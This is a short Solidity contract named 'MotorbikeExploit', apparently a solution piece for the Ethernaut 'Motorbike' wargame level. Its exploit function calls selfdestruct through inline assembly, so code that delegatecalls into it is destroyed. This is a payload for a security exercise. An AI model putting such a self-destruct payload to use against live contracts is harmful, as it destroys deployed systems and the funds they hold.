// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract MotorbikeExploit {
    function exploit() external {
        // selfdestruct(payable(msg.sender));
        assembly {
            selfdestruct(caller())
        }
    }
}
